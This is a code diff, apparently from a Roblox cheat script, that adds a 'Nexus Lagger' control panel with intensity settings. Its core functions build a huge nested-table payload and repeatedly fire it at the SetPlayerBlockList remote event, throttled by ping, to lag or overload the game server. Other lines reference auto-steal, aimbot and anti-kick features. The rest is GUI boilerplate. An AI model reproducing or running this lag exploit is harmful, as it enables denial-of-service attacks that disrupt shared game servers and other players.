+closeBtn.Size = UDim2.new(0, 20, 0, 20); closeBtn.Position = UDim2.new(1, -28, 0, 6)
+closeBtn.BackgroundColor3 = Color3.fromRGB(40, 25, 25); closeBtn.Text = "x"
+closeBtn.TextColor3 = Color3.fromRGB(200, 80, 80); closeBtn.Font = Enum.Font.GothamBold
+closeBtn.TextSize = 12; closeBtn.AutoButtonColor = false; closeBtn.BorderSizePixel = 0
+corner(closeBtn, 5)
+local minBtn = Instance.new("TextButton", titleBar)
+minBtn.Size = UDim2.new(0, 20, 0, 20); minBtn.Position = UDim2.new(1, -54, 0, 6)
+minBtn.BackgroundColor3 = Color3.fromRGB(28, 28, 36); minBtn.Text = "-"
+minBtn.TextColor3 = Color3.fromRGB(140, 140, 150); minBtn.Font = Enum.Font.GothamBold
+minBtn.TextSize = 14; minBtn.AutoButtonColor = false; minBtn.BorderSizePixel = 0
+corner(minBtn, 5)
+local body = Instance.new("Frame", f)
+body.Size = UDim2.new(1, -16, 1, -40); body.Position = UDim2.new(0, 8, 0, 36)
+body.BackgroundTransparency = 1
+local toggleRow = Instance.new("Frame", body)
+toggleRow.Size = UDim2.new(1, 0, 0, 40); toggleRow.BackgroundColor3 = Color3.fromRGB(22, 22, 28)
+toggleRow.BorderSizePixel = 0
+corner(toggleRow, 8)
+local togStroke = Instance.new("UIStroke", toggleRow)
+togStroke.Color = _G.NexusLaggerActive and Color3.fromRGB(160, 160, 175) or Color3.fromRGB(38, 38, 45)
+togStroke.Thickness = 1
+local kbBtn = Instance.new("TextButton", toggleRow)
+kbBtn.Size = UDim2.new(0, 34, 0, 26); kbBtn.Position = UDim2.new(0, 8, 0.5, -13)
+kbBtn.BackgroundColor3 = Color3.fromRGB(30, 30, 38)
+kbBtn.Text = getKeyDisplayName(_G.NexusLaggerKeybind); kbBtn.TextColor3 = Color3.fromRGB(220, 220, 225)
+kbBtn.Font = Enum.Font.GothamBold; kbBtn.TextSize = 11; kbBtn.AutoButtonColor = false
+kbBtn.BorderSizePixel = 0
+corner(kbBtn, 5)
+stroke(kbBtn, Color3.fromRGB(50, 50, 60), 1, 0)
+local statusLabel = Instance.new("TextLabel", toggleRow)
+statusLabel.Size = UDim2.new(0.5, 0, 1, 0); statusLabel.Position = UDim2.new(0, 50, 0, 0)
+statusLabel.BackgroundTransparency = 1
+statusLabel.Text = _G.NexusLaggerActive and "LAGGER: ON" or "LAGGER: OFF"
+statusLabel.TextColor3 = _G.NexusLaggerActive and Color3.fromRGB(160, 160, 175) or Color3.fromRGB(120, 120, 130)
+statusLabel.Font = Enum.Font.GothamBold; statusLabel.TextSize = 12
+statusLabel.TextXAlignment = Enum.TextXAlignment.Left
+local switchBg = Instance.new("TextButton", toggleRow)
+switchBg.Size = UDim2.new(0, 40, 0, 20); switchBg.Position = UDim2.new(1, -50, 0.5, -10)
+switchBg.BackgroundColor3 = _G.NexusLaggerActive and Color3.fromRGB(40, 40, 50) or Color3.fromRGB(35, 35, 42)
+switchBg.Text = ""
+switchBg.AutoButtonColor = false; switchBg.BorderSizePixel = 0
+local switchBgCorner = Instance.new("UICorner", switchBg)
+switchBgCorner.CornerRadius = UDim.new(1, 0)
+local switchDot = Instance.new("Frame", switchBg)
+switchDot.Size = UDim2.new(0, 14, 0, 14)
+switchDot.Position = _G.NexusLaggerActive and UDim2.new(1, -16, 0.5, -7) or UDim2.new(0, 3, 0.5, -7)
+switchDot.BackgroundColor3 = _G.NexusLaggerActive and Color3.fromRGB(160, 160, 175) or Color3.fromRGB(70, 70, 80)
+switchDot.BorderSizePixel = 0
+local switchDotCorner = Instance.new("UICorner", switchDot)
+switchDotCorner.CornerRadius = UDim.new(1, 0)
+local intRow = Instance.new("Frame", body)
+intRow.Size = UDim2.new(1, 0, 0, 40); intRow.Position = UDim2.new(0, 0, 0, 44)
+intRow.BackgroundColor3 = Color3.fromRGB(22, 22, 28); intRow.BorderSizePixel = 0
+corner(intRow, 8)
+local intStroke = Instance.new("UIStroke", intRow); intStroke.Color = Color3.fromRGB(38, 38, 45); intStroke.Thickness = 1
+local intLabel = Instance.new("TextLabel", intRow)
+intLabel.Size = UDim2.new(0, 70, 1, 0); intLabel.Position = UDim2.new(0, 10, 0, 0)
+intLabel.BackgroundTransparency = 1; intLabel.Text = "INTENSITY"
+intLabel.TextColor3 = Color3.fromRGB(100, 100, 120); intLabel.Font = Enum.Font.GothamBold
+intLabel.TextSize = 10; intLabel.TextXAlignment = Enum.TextXAlignment.Left
+local intMinus = Instance.new("TextButton", intRow)
+intMinus.Size = UDim2.new(0, 24, 0, 24); intMinus.Position = UDim2.new(0, 88, 0.5, -12)
+intMinus.BackgroundColor3 = Color3.fromRGB(32, 32, 40); intMinus.Text = "-"
+intMinus.TextColor3 = Color3.fromRGB(160, 160, 175); intMinus.Font = Enum.Font.GothamBold
+intMinus.TextSize = 14; intMinus.AutoButtonColor = false; intMinus.BorderSizePixel = 0
+corner(intMinus, 5)
+stroke(intMinus, Color3.fromRGB(50, 50, 60), 1, 0)
+local intValue = Instance.new("TextLabel", intRow)
+intValue.Size = UDim2.new(0, 40, 1, 0); intValue.Position = UDim2.new(0, 118, 0, 0)
+intValue.BackgroundTransparency = 1
+intValue.Text = tostring(math.clamp(_G.NexusLaggerIntensity or 7, 1, 10))
+intValue.TextColor3 = Color3.fromRGB(220, 220, 225); intValue.Font = Enum.Font.GothamBold
+intValue.TextSize = 14; intValue.TextXAlignment = Enum.TextXAlignment.Center
+local intPlus = Instance.new("TextButton", intRow)
+intPlus.Size = UDim2.new(0, 24, 0, 24); intPlus.Position = UDim2.new(0, 162, 0.5, -12)
+intPlus.BackgroundColor3 = Color3.fromRGB(32, 32, 40); intPlus.Text = "+"
+intPlus.TextColor3 = Color3.fromRGB(160, 160, 175); intPlus.Font = Enum.Font.GothamBold
+intPlus.TextSize = 14; intPlus.AutoButtonColor = false; intPlus.BorderSizePixel = 0
+corner(intPlus, 5)
+stroke(intPlus, Color3.fromRGB(50, 50, 60), 1, 0)
+local intDesc = Instance.new("TextLabel", intRow)
+intDesc.Size = UDim2.new(0, 50, 1, 0); intDesc.Position = UDim2.new(0, 192, 0, 0)
+intDesc.BackgroundTransparency = 1
+local intNames = {[1]="Soft",[2]="Soft",[3]="Soft",[4]="Mid",[5]="Mid",[6]="Mid",[7]="Hot",[8]="Hot",[9]="Hot",[10]="Insane"}
+intDesc.Text = intNames[math.clamp(_G.NexusLaggerIntensity or 7, 1, 10)] or "Hot"
+intDesc.TextColor3 = Color3.fromRGB(120, 120, 130); intDesc.Font = Enum.Font.GothamBold
+intDesc.TextSize = 10; intDesc.TextXAlignment = Enum.TextXAlignment.Left
+local function resolveRemote(path)
+if not path or path == "" then return nil end
+local obj = game
+local cleaned = path:gsub("^game%.", "")
+for segment in cleaned:gmatch("[^%.]+") do
+if obj then obj = obj[segment] else return nil end
+end
+return obj
+end
+local isMobile2 = UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled
+local function buildPayload(depth, maxCopies)
+local main, spam = {}, {{}}
+local z = spam[1]
+for i = 1, depth do local t = {}; table.insert(z, t); z = t end
+local maximum = math.min(maxCopies or 600, math.floor(499999 / (depth + 2)))
+for i = 1, maximum do
+table.insert(main, spam)
+end
+return main
+end
+local payloadCache = nil
+local payloadDepth = nil
+local payloadCopies = nil
+local function getPayload(depth, copies)
+if payloadCache and payloadDepth == depth and payloadCopies == copies then return payloadCache end
+payloadDepth = depth
+payloadCopies = copies
+payloadCache = buildPayload(depth, copies)
+return payloadCache
+end
+local function getLaggerConfig(intensity)
+if isMobile2 then
+if intensity <= 3 then return {depth=270, copies=400, wait=0.55}
+elseif intensity <= 6 then return {depth=280, copies=500, wait=0.40}
+elseif intensity <= 9 then return {depth=285, copies=550, wait=0.28}
+else return {depth=290, copies=600, wait=0.22} end
+else
+if intensity <= 3 then return {depth=240, copies=350, wait=0.35}
+elseif intensity <= 6 then return {depth=255, copies=400, wait=0.25}
+elseif intensity <= 9 then return {depth=265, copies=450, wait=0.18}
+else return {depth=265, copies=450, wait=0.15} end
+end
+end
+local function getPing()
+local s = game:GetService("Stats")
+local n = s and s:FindFirstChild("Network")
+local si = n and n:FindFirstChild("ServerStatsItem")
+local dp = si and si:FindFirstChild("DataPing")
+if dp then return dp:GetValue() / 1000 end
+return 0
+end
+local function startLaggerLoop()
+pcall(function() settings().Network.IncomingReplicationLag = 0 end)
+pcall(function() game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge) end)
+if not _G.NexusLaggerActive then return end
+local remote = resolveRemote("RobloxReplicatedStorage.SetPlayerBlockList")
+if not remote then return end
+local intensity = math.clamp(_G.NexusLaggerIntensity or 7, 1, 10)
+local cfg = getLaggerConfig(intensity)
+local bomb = getPayload(cfg.depth, cfg.copies)
+local fireWait = math.max(cfg.wait, 0.15)
+while _G.NexusLaggerActive do
+local ping = getPing()
+if ping < 0.35 then
+pcall(function()
+if remote:IsA("RemoteEvent") or remote:IsA("UnreliableRemoteEvent") then
+remote:FireServer(bomb)
+elseif remote:IsA("RemoteFunction") then
+remote:InvokeServer(bomb)
+end
+end)
+task.wait(fireWait)
+elseif ping < 0.7 then
+pcall(function()
+if remote:IsA("RemoteEvent") or remote:IsA("UnreliableRemoteEvent") then
+remote:FireServer(bomb)
+elseif remote:IsA("RemoteFunction") then
+remote:InvokeServer(bomb)
+end
+end)
+task.wait(fireWait * 2.5)
+else
+task.wait(0.5)
+end
+end
+end
+local function setLaggerState(on)
+_G.NexusLaggerActive = on
+local intLabel2 = ({[1]="SOFT",[2]="SOFT",[3]="SOFT",[4]="MID",[5]="MID",[6]="MID",[7]="HOT",[8]="HOT",[9]="HOT",[10]="INSANE"})[math.clamp(_G.NexusLaggerIntensity or 7, 1, 10)] or "HOT"
+statusLabel.Text = on and ("LAGGER: ON ["..intLabel2.."]") or "LAGGER: OFF"
+statusLabel.TextColor3 = on and Color3.fromRGB(160, 160, 175) or Color3.fromRGB(120, 120, 130)
+togStroke.Color = on and Color3.fromRGB(160, 160, 175) or Color3.fromRGB(38, 38, 45)
+TweenService:Create(switchDot, TweenInfo.new(0.2, Enum.EasingStyle.Quad),
+{Position = on and UDim2.new(1, -16, 0.5, -7) or UDim2.new(0, 3, 0.5, -7),
+BackgroundColor3 = on and Color3.fromRGB(160, 160, 175) or Color3.fromRGB(70, 70, 80)}):Play()
+TweenService:Create(switchBg, TweenInfo.new(0.2),
+{BackgroundColor3 = on and Color3.fromRGB(40, 40, 50) or Color3.fromRGB(35, 35, 42)}):Play()
+if on then
+_G.NexusLaggerThread = task.spawn(startLaggerLoop)
+else
+pcall(function() game:GetService("NetworkClient"):SetOutgoingKBPSLimit(0) end)
+pcall(function() settings().Network.IncomingReplicationLag = 0 end)
+payloadCache = nil; payloadDepth = nil; payloadCopies = nil
+_G.NexusLaggerThread = nil
+end
+end
+local function updateIntensity(newInt)
+_G.NexusLaggerIntensity = math.clamp(newInt, 1, 10)
+intValue.Text = tostring(_G.NexusLaggerIntensity)
+intDesc.Text = intNames[_G.NexusLaggerIntensity] or "Hot"
+local colMap = {[1]=Color3.fromRGB(130,180,130),[2]=Color3.fromRGB(130,180,130),[3]=Color3.fromRGB(130,180,130),
+[4]=Color3.fromRGB(180,180,130),[5]=Color3.fromRGB(180,180,130),[6]=Color3.fromRGB(180,180,130),
+[7]=Color3.fromRGB(180,150,130),[8]=Color3.fromRGB(180,150,130),[9]=Color3.fromRGB(180,130,130),
+[10]=Color3.fromRGB(180,110,110)}
+intDesc.TextColor3 = colMap[_G.NexusLaggerIntensity] or Color3.fromRGB(255, 140, 60)
+intStroke.Color = colMap[_G.NexusLaggerIntensity] or Color3.fromRGB(35, 35, 45)
+if _G.NexusLaggerActive then
+local ln = ({[1]="SOFT",[2]="SOFT",[3]="SOFT",[4]="MID",[5]="MID",[6]="MID",[7]="HOT",[8]="HOT",[9]="HOT",[10]="INSANE"})[_G.NexusLaggerIntensity]
+statusLabel.Text = "LAGGER: ON ["..ln.."]"
+payloadCache = nil; payloadDepth = nil; payloadCopies = nil
+setLaggerState(false); task.spawn(function() task.wait(0.1); setLaggerState(true) end)
+end
+end
+intMinus.MouseButton1Click:Connect(function() updateIntensity(_G.NexusLaggerIntensity - 1) end)
+intPlus.MouseButton1Click:Connect(function() updateIntensity(_G.NexusLaggerIntensity + 1) end)
+intMinus.MouseButton2Click:Connect(function() updateIntensity(_G.NexusLaggerIntensity - 1) end)
+intPlus.MouseButton2Click:Connect(function() updateIntensity(_G.NexusLaggerIntensity + 1) end)
+switchBg.MouseButton1Click:Connect(function()
+if _G.NexusLaggerActive then setLaggerState(false) else setLaggerState(true) end
+end)
+local listeningFor = false
+local listenStart = 0
+kbBtn.MouseButton1Click:Connect(function()
+if listeningFor then
+listeningFor = false; kbBtn.Text = getKeyDisplayName(_G.NexusLaggerKeybind)
+kbBtn.BackgroundColor3 = Color3.fromRGB(28, 28, 36); return
+end
+listeningFor = true; listenStart = tick(); kbBtn.Text = "..."
+kbBtn.BackgroundColor3 = Color3.fromRGB(180, 60, 60)
+end)
+local isMinimized = false
+local function toggleMinimize()
+isMinimized = not isMinimized
+TweenService:Create(f, TweenInfo.new(0.25, Enum.EasingStyle.Quart, Enum.EasingDirection.Out),
+{Size = isMinimized and UDim2.new(0, PW, 0, 34) or UDim2.new(0, PW, 0, PH)}):Play()
+body.Visible = not isMinimized
+end
+closeBtn.MouseButton1Click:Connect(function()
+if _G.NexusLaggerActive then setLaggerState(false) end
+TweenService:Create(f, TweenInfo.new(0.2, Enum.EasingStyle.Quart, Enum.EasingDirection.In), {Size = UDim2.new(0, PW, 0, 0)}):Play()
+task.wait(0.22)
+if sg and sg.Parent then sg:Destroy() end
+_G.NexusLaggerGui = nil
+if _G.NexusSetLaggerOpenVisual then _G.NexusSetLaggerOpenVisual(false) end
+end)
+minBtn.MouseButton1Click:Connect(toggleMinimize)
+local dragging, dragInput, dragStart, startPos = false, nil, nil, nil
+titleBar.InputBegan:Connect(function(input)
+if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+dragging = true; dragStart = input.Position; startPos = f.Position
+input.Changed:Connect(function() if input.UserInputState == Enum.UserInputState.End then dragging = false end end)
+end
+end)
+titleBar.InputChanged:Connect(function(input)
+if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then dragInput = input end
+end)
+UserInputService.InputChanged:Connect(function(input)
+if input == dragInput and dragging then
+local d = input.Position - dragStart
+f.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + d.X, startPos.Y.Scale, startPos.Y.Offset + d.Y)
+end
+end)
+UserInputService.InputBegan:Connect(function(input, processed)
+if processed then return end
+if listeningFor then
+local isGp = isGamepadInput(input)
+if isGp and tick() - listenStart < 0.15 then return end
+if isBindableInput(input) then
+_G.NexusLaggerKeybind = input.KeyCode; kbBtn.Text = getKeyDisplayName(input.KeyCode)
+kbBtn.BackgroundColor3 = Color3.fromRGB(28, 28, 36); listeningFor = false
+saveNexusConfig()
+elseif input.KeyCode == Enum.KeyCode.Unknown and not isGp then
+listeningFor = false; kbBtn.Text = getKeyDisplayName(_G.NexusLaggerKeybind)
+kbBtn.BackgroundColor3 = Color3.fromRGB(28, 28, 36)
+end
+elseif input.KeyCode == _G.NexusLaggerKeybind then
+if _G.NexusLaggerActive then setLaggerState(false) else setLaggerState(true) end
+end
+end)
+TweenService:Create(f, TweenInfo.new(0.3, Enum.EasingStyle.Quart, Enum.EasingDirection.Out), {Size = UDim2.new(0, PW, 0, PH)}):Play()
+end
+_G.NexusCloseLaggerPanel = function()
+if _G.NexusLaggerActive then
+_G.NexusLaggerActive = false
+pcall(function() game:GetService("NetworkClient"):SetOutgoingKBPSLimit(0) end)
+pcall(function() settings().Network.IncomingReplicationLag = 0 end)
+end
+if _G.NexusLaggerGui then pcall(function() _G.NexusLaggerGui:Destroy() end) end
+_G.NexusLaggerGui = nil
+if _G.NexusSetLaggerOpenVisual then _G.NexusSetLaggerOpenVisual(false) end
+end
 end
 _G.__NexusDuelsSetupSettingsUI = function()
 section(Settings, "GUI SETTINGS", 1)
@@ -6394,6 +6828,49 @@ if antiKickEnabled and _G.NexusSafeModeForceStop then _G.NexusSafeModeForceStop(
 saveNexusConfig()
 end)
 end
+end
+section(Settings, "NEXUS LAGGER", 14)
+do
+local row = baseRow(Settings, "Lagger Panel", 15)
+local openBtn = Instance.new("TextButton")
+openBtn.Name = "OpenLagger"
+openBtn.BackgroundColor3 = Color3.fromRGB(28, 28, 36)
+openBtn.BackgroundTransparency = 0
+openBtn.Text = "OPEN"
+openBtn.TextColor3 = Color3.fromRGB(160, 160, 175)
+openBtn.TextSize = 11
+openBtn.Font = Enum.Font.GothamBold
+openBtn.AutoButtonColor = false
+openBtn.BorderSizePixel = 0
+openBtn.Size = UDim2.new(0, 64, 0, 24)
+openBtn.Position = UDim2.new(1, -76, 0.5, -12)
+openBtn.ZIndex = 7
+openBtn.Parent = row
+corner(openBtn, 6)
+local obSt = Instance.new("UIStroke", openBtn)
+obSt.Color = Color3.fromRGB(55, 55, 65); obSt.Thickness = 1
+local function setLaggerOpenVisual(open)
+openBtn.Text = open and "CLOSE" or "OPEN"
+openBtn.TextColor3 = open and Color3.fromRGB(200, 100, 100) or Color3.fromRGB(160, 160, 175)
+end
+_G.NexusSetLaggerOpenVisual = setLaggerOpenVisual
+openBtn.MouseEnter:Connect(function()
+TweenService:Create(openBtn, TweenInfo.new(0.15), {BackgroundColor3 = Color3.fromRGB(38, 38, 48), TextColor3 = Color3.fromRGB(220, 220, 225)}):Play()
+TweenService:Create(obSt, TweenInfo.new(0.15), {Color = Color3.fromRGB(120, 120, 135)}):Play()
+end)
+openBtn.MouseLeave:Connect(function()
+TweenService:Create(openBtn, TweenInfo.new(0.15), {BackgroundColor3 = Color3.fromRGB(28, 28, 36), TextColor3 = Color3.fromRGB(160, 160, 175)}):Play()
+TweenService:Create(obSt, TweenInfo.new(0.15), {Color = Color3.fromRGB(55, 55, 65)}):Play()
+end)
+openBtn.MouseButton1Click:Connect(function()
+if _G.NexusLaggerGui then
+_G.NexusCloseLaggerPanel()
+else
+if _G.NexusCreateLaggerPanel then _G.NexusCreateLaggerPanel() end
+end
+setLaggerOpenVisual(_G.NexusLaggerGui ~= nil)
+saveNexusConfig()
+end)
 end
 local bgRow = Instance.new("Frame")
 bgRow.Name = "Background Image Picker"
@@ -7018,7 +7495,7 @@ currentSpeedMode = "Normal"
 autoCarrySpeedEnabled = false
 autoSwitchEnabled = false
 autoTPHeight = 20
-autoStealEnabled = false; selectedStealMode = "Semi"; autoStealRadius = 9
+autoStealEnabled = false; selectedStealMode = "Semi"; autoStealRadius = 9; semiStopPercent = 90
 _G.NexusStealRadii = {Normal = 62, Semi = 9}
 selectedAnimationPack = "None"; selectedAimbotMode = "Normal"
 AIMBOT_SPEED = 58; LAGGER_AIMBOT_SPEED = 40
@@ -7212,10 +7689,10 @@ local RunService   = game:GetService("RunService")
 local UIS = UserInputService
 local TS = TweenService
 local Stats        = game:GetService("Stats")
-local existingStealBar = LP:FindFirstChild("PlayerGui") and LP.PlayerGui:FindFirstChild("StealBarGui")
+local existingStealBar = LP:FindFirstChild("PlayerGui") and LP.PlayerGui:FindFirstChild("NexusHud")
 if existingStealBar then existingStealBar:Destroy() end
 local gui = Instance.new("ScreenGui")
-gui.Name = "StealBarGui"
+gui.Name = "NexusHud"
 gui.ResetOnSpawn = false
 gui.IgnoreGuiInset = true
 gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
@@ -7241,7 +7718,7 @@ end
 end)
 end
 local pbFrame = Instance.new("Frame", gui)
-pbFrame.Name = "StealBar"
+pbFrame.Name = "NexusHudBar"
 pbFrame.Size = UDim2.new(0, 250, 0, 52)
 pbFrame.Position = UDim2.new(0.5, -125, 0.75, 0)
 pbFrame.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
